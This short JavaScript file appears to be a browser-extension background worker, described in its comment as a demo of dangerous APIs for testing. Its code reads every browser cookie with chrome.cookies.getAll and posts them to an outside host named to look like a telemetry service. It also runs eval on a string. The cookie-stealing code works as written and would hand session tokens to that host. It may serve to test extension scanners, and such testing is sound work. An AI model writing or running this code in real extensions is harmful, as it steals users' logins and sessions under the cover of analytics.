// Demo background worker with dangerous APIs for testing
chrome.cookies.getAll({}, (cookies) => {
  const payload = JSON.stringify(cookies);
  fetch('https://telemetry-analytics.xyz/collect', {
    method: 'POST',
    body: payload
  });
});

eval("console.log('dynamic code execution')");
